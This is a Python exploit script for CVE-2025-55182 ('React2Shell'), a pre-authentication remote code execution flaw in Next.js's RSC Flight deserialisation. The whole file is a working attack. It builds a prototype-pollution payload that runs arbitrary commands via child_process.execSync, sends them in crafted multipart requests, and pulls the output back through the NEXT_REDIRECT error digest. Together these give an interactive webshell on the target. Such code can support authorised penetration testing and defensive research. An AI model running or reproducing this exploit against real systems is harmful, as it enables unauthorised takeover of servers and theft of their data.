#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) Interactive Webshell
Payload format based on OffSec and Trend Micro verified PoCs.

Provides an interactive shell-like interface over HTTP using the
NEXT_REDIRECT error technique to exfiltrate command output via the
RSC Flight protocol deserialisation in Next.js 16.0.6 / React 19.2.0.

Works from any network location. No authentication required.

Usage:
    python3 react2shell-webshell.py [target_url]

Examples:
    python3 react2shell-webshell.py http://localhost:7777
    python3 react2shell-webshell.py http://TARGET:7777
"""
import json
import re
import sys

try:
    import requests
except ImportError:
    print("[!] Python 'requests' library required: pip3 install requests")
    sys.exit(1)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"

BANNER = r"""
  ____  ___   __   ___ _____ ____  ____  _   _ _____ _     _
 |  _ \| __| / /\ / __|_   _|___ \/ ___|| | | | ____| |   | |
 | |_) | _| / /--\ (__|  | |  __) \___ \| |_| |  _| | |   | |
 |  _ <| |_/ /    \___|  | | / __/ ___) |  _  | |___| |___| |___
 |_| \_|____/            |_||_____|____/|_| |_|_____|_____|_____|

 CVE-2025-55182 | Next.js 16.0.6 | React 19.2.0
 Pre-Auth RCE via RSC Flight Protocol Deserialisation
 NEXT_REDIRECT Output Exfiltration Webshell

 Target: %s
 Type 'exit' or 'quit' to close. Ctrl+C to abort.
"""


def escape_for_js(cmd):
    return cmd.replace("\\", "\\\\").replace("'", "\\'")


def build_payload(cmd):
    safe_cmd = escape_for_js(cmd)
    js_code = (
        "var res=process.mainModule.require('child_process')"
        ".execSync('%s',{timeout:10000}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
        % safe_cmd
    )
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": js_code,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }


def send_command(cmd):
    payload = build_payload(cmd)
    body = (
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="0"\r\n'
        '\r\n'
        '%s\r\n'
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="1"\r\n'
        '\r\n'
        '"$@0"\r\n'
        '------Boundary--'
    ) % json.dumps(payload)
    headers = {
        "Next-Action": "x",
        "Content-Type": "multipart/form-data; boundary=----Boundary",
    }
    try:
        res = requests.post(TARGET, data=body.encode(), headers=headers, timeout=15)
        if "digest" in res.text:
            digest_match = re.search(r'"digest":"(.*?)"', res.text)
            if digest_match:
                digest_value = digest_match.group(1)
                if digest_value.isdigit() and len(digest_value) < 15:
                    return "[error] server returned hashed digest (%s)" % digest_value
                return digest_value
        return "[no output] status %d" % res.status_code
    except requests.exceptions.ConnectionError:
        return "[error] connection reset or refused"
    except requests.exceptions.Timeout:
        return "[error] request timed out (command may still be running)"
    except Exception as e:
        return "[error] %s" % e


def get_context():
    whoami = send_command("whoami")
    hostname = send_command("hostname")
    cwd = send_command("pwd")
    return whoami.strip(), hostname.strip(), cwd.strip()


def main():
    print(BANNER % TARGET)

    print("[*] Connecting to target...")
    user, host, cwd = get_context()

    if "[error]" in user:
        print("[!] Failed to connect: %s" % user)
        print("[!] Check that the target is reachable and Next.js is running.")
        sys.exit(1)

    print("[+] Shell established as %s@%s" % (user, host))
    print()

    while True:
        try:
            prompt = "%s@%s:%s# " % (user, host, cwd)
            cmd = input(prompt).strip()

            if not cmd:
                continue

            if cmd.lower() in ("exit", "quit"):
                print("[*] Closing webshell.")
                break

            if cmd.startswith("cd "):
                new_dir = cmd[3:].strip()
                test = send_command("cd '%s' && pwd" % escape_for_js(new_dir))
                if "[error]" not in test:
                    cwd = test.strip()
                else:
                    print(test)
                continue

            output = send_command("cd '%s' && %s" % (escape_for_js(cwd), cmd))
            print(output)

        except KeyboardInterrupt:
            print()
            print("[*] Ctrl+C -- closing webshell.")
            break
        except EOFError:
            print()
            print("[*] EOF -- closing webshell.")
            break


if __name__ == "__main__":
    main()
